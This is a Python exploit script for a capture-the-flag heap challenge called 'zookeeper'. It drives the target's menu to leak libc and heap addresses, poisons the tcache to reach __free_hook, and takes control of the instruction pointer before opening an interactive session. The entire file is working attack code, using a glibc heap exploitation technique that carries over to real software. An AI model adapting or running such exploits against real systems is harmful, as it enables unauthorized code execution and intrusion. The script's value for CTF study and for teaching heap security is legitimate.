#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe = context.binary = ELF("./vuln")
host = args.HOST or "zookeeper.chal.imaginaryctf.org"
port = int(args.PORT or 1337)

gdbscript = """
tbreak main
# b *main+294
# b *main+592
continue
""".format(
    **locals()
)

libc = SetupLibcELF()
io = start()


def findLion(idx, len, content):
    sla(b"(v)iew a lion", b"f")
    sla(b"idx", str(idx).encode("latin-1"))
    sla(b"len", str(len).encode("latin-1"))
    sla(b"content", content)


def viewLion(idx):
    sla(b"(v)iew a lion", b"v")
    sla(b"idx", str(idx).encode("latin-1"))


def freeLion(idx):
    sla(b"(v)iew a lion", b"l")
    sla(b"idx", str(idx).encode("latin-1"))


findLion(0, 1024, b"x" * 7)

findLion(1, 400, b"a" * 7)

findLion(2, 80, b"\xff" * 0x37)  # to get heap leak

findLion(3, 80, b"\xff" * 78)

findLion(4, 80, b"\xff" * 78)

viewLion(1)

reu(b"aaaaaaa\x0a")
libc.address = uuu64(rl()) - 0x1EAD70
lb()

for i in range(14):
    findLion(4, 0x20 - 8, b"a" * 8)

for i in range(7):
    findLion(4, 0x70 - 8, b"a" * 8)

for i in range(7):
    findLion(4, 0x80 - 8, b"a" * 8)

viewLion(2)
reu(b"\xff\n")
heap_base = uuu64(ren(6)) - 0x1A10
hb()


findLion(0, 79, b"a" * 8)
freeLion(0)
findLion(
    4,
    0x290 - 8,
    b"\x01"
    + b"\x00" * 30
    + b"\x00"
    + b"\x01" * 32
    + b"\x00"
    + b"\x00" * 63
    + p(libc.sym["__free_hook"])
    + p(0) * 30
    + p(0xDEADBEEF),
)

findLion(1, 0x10, p(0xDEADBEEF))  # rip control on free_hook
findLion(1, 0x210 - 8, p(0xDEADBEEF))  # rip control on free_hook

io.interactive()
